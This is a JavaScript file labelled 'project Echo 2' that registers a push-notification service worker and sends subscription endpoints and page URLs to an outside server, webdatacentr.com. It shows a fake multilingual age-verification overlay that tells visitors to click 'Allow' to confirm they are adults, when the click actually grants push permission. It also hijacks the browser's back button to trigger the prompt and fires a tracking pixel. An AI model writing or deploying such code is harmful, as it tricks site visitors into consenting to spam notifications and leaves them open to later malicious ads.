/**
 * project Echo 2
 */

(function(f, g, n) {
    function p(a, b) {
        return fetch("https://webdatacentr.com/push/api/", {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                action: a,
                data: b || {}
            })
        }).then(function(a) {
            return a.json()
        }).then(function(a) {
            return "Ok" == a.status ? Promise.resolve(a.data) : Promise.reject(a.data)
        })
    }

    function l() {
        return h.get("subscribe").then(function(a) {
            e = a == g ? !1 : a;
            return Promise.resolve(e)
        })
    }
    if (!("echo" in f)) {
        f.echo = {
            subscribe: function(a, b) {
                b(!1)
            },
            status: function(a) {
                a("unsupported")
            }
        };
        var e = !1,
            h = function() {
                function a() {
                    return new Promise(function(a, c) {
                        if (b) return a();
                        var d = indexedDB.open("echo", 42);
                        d.onerror = function(a) {
                            c(a)
                        };
                        d.onsuccess = function(c) {
                            b = c.target.result;
                            a()
                        };
                        d.onupgradeneeded = function(a) {
                            a.target.result.createObjectStore("ud", {
                                keyPath: "key"
                            })
                        }
                    })
                }
                var b = null;
                return {
                    get: function(d) {
                        return new Promise(function(c) {
                            a().then(function() {
                                b.transaction(["ud"], "readonly").objectStore("ud").get(d).onsuccess = function(a) {
                                    c(a.target.result !== g ? a.target.result.value : g)
                                }
                            })
                        })
                    },
                    set: function(d,
                        c) {
                        return new Promise(function(e, f) {
                            a().then(function() {
                                var a = b.transaction(["ud"], "readwrite").objectStore("ud").put({
                                    key: d,
                                    value: c
                                });
                                a.onerror = f;
                                a.onsuccess = e.bind(null, c)
                            })
                        })
                    }
                }
            }();
        if (n) {
            if (!["indexedDB", "Promise", "Permissions", "ServiceWorker", "PushManager"].some(function(a) {
                    return !(a in f)
                })) {
                var k = !1,
                    m = !1;
                f.echo = {
                    subscribe: function(a, b) {
                        k = b;
                        m = a
                    },
                    status: function(a) {
                        navigator.permissions.query({
                            name: "push",
                            userVisibleOnly: !0
                        }).then(function(b) {
                            l().then(function(d) {
                                a(b.state)
                            })
                        })
                    }
                };
                l().then(function() {
                    navigator.serviceWorker.register("/echo2.min.js");
                    return navigator.serviceWorker.ready
                }).then(function(a) {
                    f.echo.subscribe = function(b, d) {
                        document.querySelector("link[rel=manifest]") || document.head.insertAdjacentHTML("beforeEnd", '<link rel="manifest" href="/echo.json">');
                        a.pushManager.subscribe({
                            userVisibleOnly: !0
                        }).then(function(a) {
                            a = JSON.stringify(a);
                            a != e ? (e = a, p("subscribe", {
                                endpoint: e,
                                url: location.href,
                                param: b
                            }).then(function() {
                                h.set("subscribe", e).then(d.bind(null, e))
                            })) : d(e)
                        }, function(a) {
                            d(!1)
                        })
                    };
                    k && f.echo.subscribe(m, k)
                })
            }
        } else addEventListener("pushsubscriptionchange",
            function(a) {
                a.waitUntil(registration.pushManager.subscribe({
                    userVisibleOnly: !0
                }).then(function(a) {
                    e = JSON.stringify(a);
                    return h.set("subscribe", e)
                }))
            }), addEventListener("push", function(a) {
            a.data && (a = a.data.json(), a.params.requireInteraction = !0, a.waitUntil(registration.showNotification(a.title, a.params)))
        }), addEventListener("notificationclick", function(a) {
            a.notification.close();
            var b = a.notification.data.url;
            a.action !== g && a.notification.data[a.action] && (b = a.notification.data[a.action]);
            a.waitUntil(clients.matchAll().then(function(a) {
                for (var c =
                        0; c < a.length; c++)
                    if (a[c].url === b) return a[c].focus();
                clients.openWindow(b)
            }))
        })
    }
})(self, void 0, !("importScripts" in self));

/**
 *
 */

if (!('importScripts' in self) && location.protocol == 'https:') {
    (function() {
        var browser = (function() {
            var b = navigator.userAgent,
                a = b.match(/(opera|chrome|safari|firefox(?=\/))\/?\s*(\d+)/i) || [],
                d = -1 < b.indexOf("android") || -1 < b.indexOf("Android"),
                c;
            return "Chrome" === a[1] && (c = b.match(/\bOPR\/(\d+)/), null != c) ? {
                name: "opera",
                version: c[1],
                android: d
            } : (a = a[2] ? [a[1], a[2]] : [navigator.appName, navigator.appVersion, "-?"], null != (c = b.match(/version\/(\d+)/i)) && a.splice(1, 1, c[1]), {
                name: a[0].toLowerCase(),
                version: a[1],
                android: d
            })
        })();
        var texts = {
                'ru': '<p>Контент сайта может содержать материалы, предназначенные для лиц старше 18 лет.</p>Подтвердите своё совершеннолетие, нажав на кнопку «Разрешить».',
                'ro': '<p>Acest website poate conține materiale restricționate în funcție de vârstă.</p>Apăsați butonul „Permite” pentru a confirma că sunteți adult.',
                'th': '<p>เว็บไซต์นี้อาจมีเนื้อหาที่จำกัดอายุ ปุ่ม "อนุญาต"</p>คือการยืนยันว่าคุณเป็นผู้ที่มีอายุเหมาะสมในการเข้าชม',
                'eg': '<p>هذا الموقع الإلكتروني يحتوي على مواد مسموح بها للبالغين فقط.</p> اضغط على الزر Allow (سماح) للتأكيد على أنك شخص بالغ.',
                'ee': '<p>See lehekülg võib sisaldada vanusepiiranguga materjali.</p>"Luba" nupp kinnitamaks, et oled täiskasvanu.',
                'vn': '<p>Trang web này có thể chứa các nội dung giới hạn độ tuổi người xem.</p>Bấm vào nút "Cho phép" để xác nhận rằng bạn là một người lớn.',
                'my': '<p>Laman web ini mungkin mengandungi bahan yang tidak sesuai untuk semua umur.</p>Klik butang "Benarkan" untuk pengesahan bahawa anda adalah seorang dewasa.',
                'hu': '<p>Ez a weboldal korhatáros anyagokat tartalmazhat.</p>Kattintson az “Engedélyezés” gombra, hogy megerősítse, Ön nagykorú.',
                // 'es': '<p>Este sitio web puede contener materiales restringidos por edad.</p>Pulse el botón "Permitir" para confirmar que es mayor de edad.',
                'es': '<p>El contenido del sitio puede contener materiales destinados a personas mayores de 18 años.</p>Confirme que es mayor de edad haciendo clic en el botón "Permitir".',
                'dk': '<p>Hjemmesiden kan indeholde aldersbegrænsede medier.</p>Klik på "Tillad"-knappen for at bekræfte at du er over 18.',
                'az': '<p>Bu veb-saytda yaşla əlaqədar məhdudlaşdırılan materiallar var.</p>Yetkin olduğunuzu təsdiq etmək üçün "İcazə ver" düyməsinə klikləyin.',
                'se': '<p>Denna webbsida kan innehåll material som är begränsat för en viss ålder.</p>"Tillåt" knappen för att bekräfta att du är vuxen.',
                'ph': '<p>Maaaring naglalaman ng mga materyales na pinaghihigpitan ng edad ang website na ito.</p>Pindutin ang "payagan" para sa kumpirmasyon na may sapat na gulang ka.',
                'cz': '<p>Tato webová stránka může obsahovat materiál nevhodný pro mladistvé.</p>Prosím klikněte na tlačítko "Otevřít" a potvrďte, že vám již bylo 18 let.',
                'it': '<p>I contenuti del sito possono contenere materiali destinati a persone di età uguale o superiore a 18 anni.</p>Conferma che sei maggiorenne, cliccando sul pulsante «Consentire».',
                'fr': '<p>Le site contient du matériel destiné aux personnes adultes.</p>Veuillez confirmer que vous avez plus de 18 ans en cliquant sur le bouton «Autoriser».',
                'de': '<p>Der Inhalt der Website kann Materialien enthalten, die für Personen unter 18 nicht  geeignet sind.</p>Bestätigen Sie, dass Sie volljährig sind, indem Sie auf die "Zulassen" klicken.',
                'pt': '<p>O conteúdo do site pode conter materiais destinados a pessoas com mais de 18 anos de idade.</p>Confirme a sua idade adulta clicando no botão "Permitir".',
                'tr': '<p>Site içeriği 18 yaşın üzerinde olan kişiler için tasarlanmıştır.</p>Reşit olduğunuzu «İzin ver» butonuna tıklayarak onaylayabilirsiniz.',
                'hi': '<p>इस साइट पर दी गई सामग्री 18 वर्ष से अधिक आयु के व्यक्तियों के लिए हो सकती ह</p>अनुमति" बटन को दबाकर अपने वयस्क होने की पुष्टि कीजिए',
                'el': '<p>Το περιεχόμενο του ιστότοπου ενδέχεται να περιέχει υλικό που απευθύνεται σε άτομα άνω των 18 ετών.</p>Επιβεβαιώστε πως είστε άνω των 18 ετών πιέζοντας το πλήκτρο «Επιτρέπεται».',
                'nl': '<p>Deze website bevat mogelijk materiaal waarvoor een leeftijdsbeperking geldt.</p>Klik op "Toestaan" om te bevestigen dat u 18 jaar of ouder bent.'
            },
            brLang = navigator.language.split('-')[0],
            css = '.pushUp{position:fixed;top:0;left:0;border:none;width:100%;height:100%;z-index:5000;background-color:rgba(0,0,0,.85);font:700 18px \'PT Sans\',sans-serif}.pushUp div{position:absolute;top:170px;left:120px;background-color:#fff;width:440px;border:1px solid #c7c7c7;border-radius:3px;padding:30px}.pushUp div:before{content:\'\';display:block;width:25px;height:29px;position:absolute;background:url(/arrow.png) no-repeat;top:-29px;left:145px}.pushUp p{font-size:15px;font-weight:400;background:url(/18.png) no-repeat;padding:0 0 0 75px;min-height:62px;margin:0 0 15px;display:flex;align-items:center}.pushUp.opera div{left:calc(50% - 220px);top:200px}.pushUp.opera div:before{left:335px}.pushUp.firefox div{left:270px;top:200px}.pushUp.firefox div:before{left:85px}.pushUp.chrome.android div{left:5%;top:15px;width:90%;font-size:25px}.pushUp.chrome.android p{font-size:20px}.pushUp.chrome.android div:before{left:415px;transform:rotate(180deg);top:auto;bottom:-29px}@media only screen and (orientation:landscape){.pushUp.chrome.android div{left:calc(50% - 270px);top:15px;width:540px;padding:15px;min-height:95px;font-size:15px}.pushUp.chrome.android p{background-size:40px;padding-left:50px;min-height:40px;margin-bottom:10px;font-size:15px}.pushUp.chrome.android div:before{display:none}}',
            html = '<div class="pushUp" style="display: none;"><div><p>This website may contains age-restricted materials.</p>Click "Allow" button for confirmation that you are an adult.</div></div>';

        if (brLang in texts) {
            html = '<div class="pushUp" style="display: none;"><div>' + texts[brLang] + '</div></div>';
        }

        function load() {
            document.head.insertAdjacentHTML('beforeEnd', '<style type="text/css">' + css + '</style>');
            document.body.insertAdjacentHTML('beforeEnd', html);
            var d = document.querySelector('.pushUp');
            d.classList.add(browser.name);
            if (browser.android) {
                d.classList.add('android');
            }

            history.pushState({
                back: true
            }, '', location.href);
            history.pushState({}, '', location.href);
            window.addEventListener('popstate', function(event) {
                if (event.state && event.state.back) {
                    // back
                    var doamin = decodeURI((RegExp('trackingdomain=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
                    if (doamin != '') {
                        // navigator.sendBeacon('https://' + doamin + '/click/2');
                        document.body.insertAdjacentHTML('beforeEnd', '<img src="http://' + doamin + '/click/2" />');
                    }

                    echo.status(function(status) {
                        if (status == 'prompt') {
                            d.style.display = 'block';
                            echo.subscribe('pop', function(succ) {
                                location.reload();
                            });
                        } else {
                            location.reload();
                        }
                    })
                }
            }, false);
        }

        if (['complete', 'loaded', 'interactive'].indexOf(document.readyState) != -1) {
            load();
        } else {
            document.addEventListener('DOMContentLoaded', load)
        }
    })()
}